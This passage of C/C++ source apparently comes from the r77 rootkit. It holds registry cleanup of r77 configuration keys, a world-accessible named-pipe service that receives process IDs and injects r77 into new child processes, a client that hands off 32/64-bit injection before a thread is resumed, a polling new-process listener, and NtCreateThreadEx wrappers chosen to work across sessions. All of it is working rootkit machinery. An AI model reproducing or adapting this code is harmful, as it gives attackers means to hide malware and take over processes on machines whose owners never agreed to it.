					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);

					lstrcpyW(subKeyName, configKeyName);
					lstrcatW(subKeyName, L"\\udp");
					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);

					RegDeleteKeyExW(HKEY_USERS, configKeyName, KEY_ALL_ACCESS, 0);
				}
			}
		}

		RegCloseKey(usersKey);
	}
}

DWORD WINAPI ChildProcessListenerThread(LPVOID parameter)
{
	// Get security attributes for "EVERYONE", so the named pipe is accessible to all processes.

	SID_IDENTIFIER_AUTHORITY authority = SECURITY_WORLD_SID_AUTHORITY;
	PSID everyoneSid;
	if (!AllocateAndInitializeSid(&authority, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyoneSid)) return 0;

	EXPLICIT_ACCESSW explicitAccess;
	ZeroMemory(&explicitAccess, sizeof(EXPLICIT_ACCESSW));
	explicitAccess.grfAccessPermissions = FILE_ALL_ACCESS;
	explicitAccess.grfAccessMode = SET_ACCESS;
	explicitAccess.grfInheritance = NO_INHERITANCE;
	explicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	explicitAccess.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	explicitAccess.Trustee.ptstrName = (LPWSTR)everyoneSid;

	PACL acl;
	if (SetEntriesInAclW(1, &explicitAccess, NULL, &acl) != ERROR_SUCCESS) return 0;

	PSECURITY_DESCRIPTOR securityDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (!securityDescriptor ||
		!InitializeSecurityDescriptor(securityDescriptor, SECURITY_DESCRIPTOR_REVISION) ||
		!SetSecurityDescriptorDacl(securityDescriptor, TRUE, acl, FALSE)) return 0;

	SECURITY_ATTRIBUTES securityAttributes;
	securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	securityAttributes.lpSecurityDescriptor = securityDescriptor;
	securityAttributes.bInheritHandle = FALSE;

	while (true)
	{
		HANDLE pipe = CreateNamedPipeW(sizeof(LPVOID) == 4 ? CHILD_PROCESS_PIPE_NAME32 : CHILD_PROCESS_PIPE_NAME64, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, &securityAttributes);
		while (pipe != INVALID_HANDLE_VALUE)
		{
			if (ConnectNamedPipe(pipe, NULL))
			{
				DWORD processId;
				DWORD bytesRead;
				if (ReadFile(pipe, &processId, 4, &bytesRead, NULL))
				{
					// Invoke the callback. The callback should inject r77 into the process.
					((PROCESSIDCALLBACK)parameter)(processId);

					// Notify the callee that the callback completed (r77 is injected) and NtResumeThread can be called.
					BYTE returnValue = 77;
					DWORD bytesWritten;
					WriteFile(pipe, &returnValue, sizeof(BYTE), &bytesWritten, NULL);
				}
			}
			else
			{
				Sleep(1);
			}

			DisconnectNamedPipe(pipe);
		}

		Sleep(1);
	}

	return 0;
}
VOID ChildProcessListener(PROCESSIDCALLBACK callback)
{
	CreateThread(NULL, 0, ChildProcessListenerThread, callback, 0, NULL);
}
BOOL HookChildProcess(DWORD processId)
{
	BOOL result = FALSE;

	BOOL is64Bit;
	if (Is64BitProcess(processId, &is64Bit))
	{
		// Call either the 32-bit or the 64-bit r77 service and pass the process ID.
		// Because a 32-bit process can create a 64-bit child process, or vice versa, injection cannot be performed in the same process.

		HANDLE pipe = CreateFileW(is64Bit ? CHILD_PROCESS_PIPE_NAME64 : CHILD_PROCESS_PIPE_NAME32, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (pipe != INVALID_HANDLE_VALUE)
		{
			// Send the process ID to the r77 service.
			DWORD bytesWritten;
			WriteFile(pipe, &processId, sizeof(DWORD), &bytesWritten, NULL);

			// Wait for the response before returning. NtResumeThread should be called after r77 is injected.
			BYTE returnValue;
			DWORD bytesRead;
			result = ReadFile(pipe, &returnValue, sizeof(BYTE), &bytesRead, NULL) && returnValue == 77;

			CloseHandle(pipe);
		}
	}

	return result;
}

DWORD WINAPI NewProcessListenerThread(LPVOID parameter)
{
	PNEW_PROCESS_LISTENER notifier = (PNEW_PROCESS_LISTENER)parameter;

	LPDWORD currendProcesses = new DWORD[10000];
	LPDWORD previousProcesses = new DWORD[10000];
	DWORD currendProcessCount = 0;
	DWORD previousProcessCount = 0;

	while (true)
	{
		if (EnumProcesses(currendProcesses, sizeof(DWORD) * 10000, &currendProcessCount))
		{
			currendProcessCount /= sizeof(DWORD);

			for (DWORD i = 0; i < currendProcessCount; i++)
			{
				// Compare the result of EnumProcesses with the previous list and invoke the callback for new processes.
				BOOL isNew = TRUE;

				for (DWORD j = 0; j < previousProcessCount; j++)
				{
					if (currendProcesses[i] == previousProcesses[j])
					{
						isNew = FALSE;
						break;
					}
				}

				if (isNew) notifier->Callback(currendProcesses[i]);
			}

			RtlCopyMemory(previousProcesses, currendProcesses, sizeof(DWORD) * 10000);
			previousProcessCount = currendProcessCount;
		}

		Sleep(notifier->Interval);
	}

	return 0;
}
PNEW_PROCESS_LISTENER NewProcessListener(DWORD interval, PROCESSIDCALLBACK callback)
{
	PNEW_PROCESS_LISTENER notifier = new NEW_PROCESS_LISTENER();
	notifier->Interval = interval;
	notifier->Callback = callback;

	CreateThread(NULL, 0, NewProcessListenerThread, notifier, 0, NULL);
	return notifier;
}

namespace nt
{
	NTSTATUS NTAPI NtQueryObject(HANDLE handle, nt::OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength)
	{
		return ((nt::NTQUERYOBJECT)GetFunction("ntdll.dll", "NtQueryObject"))(handle, objectInformationClass, objectInformation, objectInformationLength, returnLength);
	}
	NTSTATUS NTAPI NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer)
	{
		// Use NtCreateThreadEx instead of CreateRemoteThread.
		// CreateRemoteThread does not work across sessions in Windows 7.
		return ((nt::NTCREATETHREADEX)GetFunction("ntdll.dll", "NtCreateThreadEx"))(thread, desiredAccess, objectAttributes, processHandle, startAddress, parameter, flags, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, bytesBuffer);
	}
}